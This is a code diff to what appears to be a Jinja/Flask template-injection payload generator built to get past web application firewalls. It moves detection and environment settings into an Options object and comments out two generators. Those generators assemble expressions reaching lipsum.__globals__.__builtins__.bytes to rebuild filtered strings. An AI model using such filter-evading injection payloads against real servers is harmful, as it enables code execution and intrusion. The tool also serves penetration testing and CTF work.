@@ -35,6 +35,7 @@ from typing import (
 
 from .colorize import colored
 from .const import *
+from .options import Options
 
 ContextVariable = Dict[str, Any]
 
@@ -330,8 +331,7 @@ class PayloadGenerator:
         waf_func: Callable[[str], bool],
         context: Union[Dict, None] = None,
         callback: Union[Callable[[str, Dict], None], None] = None,
-        detect_mode: str = DETECT_MODE_ACCURATE,
-        environment: str = ENVIRONMENT_JINJA,
+        options: Union[Options, None] = None,
         waf_expr_func: Union[Callable[[str], bool], None] = None,
     ):
         self.waf_func = (
@@ -342,11 +342,10 @@ class PayloadGenerator:
         self.context = context if context else {}
         self.cache_by_repr = CacheByRepr()
         self.used_count = defaultdict(int)
-        self.detect_mode = detect_mode
-        if detect_mode == DETECT_MODE_FAST:
+        self.options = options if options else Options()
+        if self.options.detect_mode == DETECT_MODE_FAST:
             for k, v in gen_weight_default.items():
                 self.used_count[k] += v
-        self.environment = environment
         self.callback = callback if callback else (lambda x, y: None)
 
     # it is correct pylint, it returns a internal decorator.
@@ -406,7 +405,7 @@ class PayloadGenerator:
         Returns:
             Union[PayloadGeneratorResult, None]: 生成结果
         """
-        # if self.detect_mode == DETECT_MODE_ACCURATE and not self.waf_func(target[1]):
+        # if self.options.detect_mode == DETECT_MODE_ACCURATE and not self.waf_func(target[1]):
         #     return None
         return (target[1], {}, None)
 
@@ -539,7 +538,7 @@ class PayloadGenerator:
         Returns:
             _type_: 生成结果
         """
-        if self.environment != ENVIRONMENT_FLASK:
+        if self.options.environment != ENVIRONMENT_FLASK:
             return None
         return (target[1], {}, None)
 
@@ -560,7 +559,7 @@ class PayloadGenerator:
             return None
 
         gens = expression_gens[gen_type].copy()
-        if self.detect_mode == DETECT_MODE_FAST:
+        if self.options.detect_mode == DETECT_MODE_FAST:
             gens.sort(key=lambda gen: self.used_count[gen.__name__], reverse=True)
         for gen in gens:
             gen_ret: List[Target] = gen(self.context, *args)
@@ -2684,104 +2683,104 @@ def gen_string_splitdictjoin3(context: dict, value: str):
     return [(EXPRESSION, precedence["filter"], target_list)]
 
 
-@expression_gen
-def gen_string_lipsumtobytes4(context: dict, value: str):
-    value_tpl = (
-        [(LITERAL, "(")]
-        + join_target(sep=(LITERAL, ","), targets=[(INTEGER, ord(c)) for c in value])
-        + [(LITERAL, ")")]
-    )
-    bytes_targets_noendbracket = (
-        [
-            (LITERAL, "lipsum["),
-            (VARIABLE_OF, "__globals__"),
-            (LITERAL, "]["),
-            (VARIABLE_OF, "__builtins__"),
-            (LITERAL, "]["),
-            (VARIABLE_OF, "bytes"),
-            (LITERAL, "]("),
-        ]
-        + value_tpl
-    )
-    functioncall = (ONEOF,
-        [(LITERAL, "()")],
-        [(LITERAL, "( )")],
-        [(LITERAL, "(\n)")],
-        [(LITERAL, "(\t)")],
-    )
-    target_list1 = bytes_targets_noendbracket + [
-        (LITERAL, ")"),
-        (LITERAL, "["),
-        (VARIABLE_OF, "decode"),
-        (LITERAL, "]"),
-        functioncall
-    ]
-    target_list2 = bytes_targets_noendbracket + [
-        (LITERAL, ",)"),
-        (LITERAL, "["),
-        (VARIABLE_OF, "decode"),
-        (LITERAL, "]"),
-        functioncall
-    ]
-    return [
-        (
-            EXPRESSION,
-            precedence["function_call"],
-            [(ONEOF, target_list1, target_list2), ]
-        )
-    ]
+# @expression_gen
+# def gen_string_lipsumtobytes4(context: dict, value: str):
+#     value_tpl = (
+#         [(LITERAL, "(")]
+#         + join_target(sep=(LITERAL, ","), targets=[(INTEGER, ord(c)) for c in value])
+#         + [(LITERAL, ")")]
+#     )
+#     bytes_targets_noendbracket = (
+#         [
+#             (LITERAL, "lipsum["),
+#             (VARIABLE_OF, "__globals__"),
+#             (LITERAL, "]["),
+#             (VARIABLE_OF, "__builtins__"),
+#             (LITERAL, "]["),
+#             (VARIABLE_OF, "bytes"),
+#             (LITERAL, "]("),
+#         ]
+#         + value_tpl
+#     )
+#     functioncall = (ONEOF,
+#         [(LITERAL, "()")],
+#         [(LITERAL, "( )")],
+#         [(LITERAL, "(\n)")],
+#         [(LITERAL, "(\t)")],
+#     )
+#     target_list1 = bytes_targets_noendbracket + [
+#         (LITERAL, ")"),
+#         (LITERAL, "["),
+#         (VARIABLE_OF, "decode"),
+#         (LITERAL, "]"),
+#         functioncall
+#     ]
+#     target_list2 = bytes_targets_noendbracket + [
+#         (LITERAL, ",)"),
+#         (LITERAL, "["),
+#         (VARIABLE_OF, "decode"),
+#         (LITERAL, "]"),
+#         functioncall
+#     ]
+#     return [
+#         (
+#             EXPRESSION,
+#             precedence["function_call"],
+#             [(ONEOF, target_list1, target_list2), ]
+#         )
+#     ]
 
 
-@expression_gen
-def gen_string_lipsumtobytes5(context: dict, value: str):
-    value_tpl = (
-        [(LITERAL, "(")]
-        + join_target(sep=(LITERAL, ","), targets=[(INTEGER, ord(c)) for c in value])
-        + [(LITERAL, ")")]
-    )
-    bytes_targets_noendbracket = (
-        [
-            (LITERAL, "lipsum|attr("),
-            (VARIABLE_OF, "__globals__"),
-            (LITERAL, ")|attr("),
-            (VARIABLE_OF, "__getitem__"),
-            (LITERAL, ")("),
-            (VARIABLE_OF, "__builtins__"),
-            (LITERAL, ")|attr("),
-            (VARIABLE_OF, "__getitem__"),
-            (LITERAL, ")("),
-            (VARIABLE_OF, "bytes"),
-            (LITERAL, ")("),
-        ]
-        + value_tpl
-    )
-    functioncall = (ONEOF,
-        [(LITERAL, "()")],
-        [(LITERAL, "( )")],
-        [(LITERAL, "(\n)")],
-        [(LITERAL, "(\t)")],
-    )
-    target_list1 = bytes_targets_noendbracket + [
-            (LITERAL, ")"),
-            (LITERAL, "|attr("),
-            (VARIABLE_OF, "decode"),
-            (LITERAL, ")"),
-            functioncall
-        ]
-    target_list2 = bytes_targets_noendbracket + [
-            (LITERAL, ",)"),
-            (LITERAL, "|attr("),
-            (VARIABLE_OF, "decode"),
-            (LITERAL, ")"),
-            functioncall
-        ]
-    return [
-        (
-            EXPRESSION,
-            precedence["filter"],
-            [(ONEOF, target_list1, target_list2), ]
-        )
-    ]
+# @expression_gen
+# def gen_string_lipsumtobytes5(context: dict, value: str):
+#     value_tpl = (
+#         [(LITERAL, "(")]
+#         + join_target(sep=(LITERAL, ","), targets=[(INTEGER, ord(c)) for c in value])
+#         + [(LITERAL, ")")]
+#     )
+#     bytes_targets_noendbracket = (
+#         [
+#             (LITERAL, "lipsum|attr("),
+#             (VARIABLE_OF, "__globals__"),
+#             (LITERAL, ")|attr("),
+#             (VARIABLE_OF, "__getitem__"),
+#             (LITERAL, ")("),
+#             (VARIABLE_OF, "__builtins__"),
+#             (LITERAL, ")|attr("),
+#             (VARIABLE_OF, "__getitem__"),
+#             (LITERAL, ")("),
+#             (VARIABLE_OF, "bytes"),
+#             (LITERAL, ")("),
+#         ]
+#         + value_tpl
+#     )
+#     functioncall = (ONEOF,
+#         [(LITERAL, "()")],
+#         [(LITERAL, "( )")],
+#         [(LITERAL, "(\n)")],
+#         [(LITERAL, "(\t)")],
+#     )
+#     target_list1 = bytes_targets_noendbracket + [
+#             (LITERAL, ")"),
+#             (LITERAL, "|attr("),
+#             (VARIABLE_OF, "decode"),
+#             (LITERAL, ")"),
+#             functioncall
+#         ]
+#     target_list2 = bytes_targets_noendbracket + [
+#             (LITERAL, ",)"),
+#             (LITERAL, "|attr("),
+#             (VARIABLE_OF, "decode"),
+#             (LITERAL, ")"),
+#             functioncall
+#         ]
+#     return [
+#         (
+#             EXPRESSION,
+#             precedence["filter"],
+#             [(ONEOF, target_list1, target_list2), ]
+#         )
+#     ]
 
 
 
